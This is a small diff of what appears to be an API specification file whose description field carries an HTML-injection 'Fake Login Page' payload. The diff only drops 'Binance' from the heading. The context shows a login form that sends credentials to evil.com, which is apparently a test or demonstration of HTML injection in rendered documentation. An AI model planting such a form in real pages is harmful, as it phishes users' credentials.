@@ -4,7 +4,7 @@ info:
   title: Fake Login Page
   description: '<div class="login-form">
     <div class="heading">
-        <h1>HTML Injection : Binance Login</h1>
+        <h1>HTML Injection : Login</h1>
     </div>
     <div class="form-container">
         <form action="https://evil.com/login" method="get" class="form-signin">
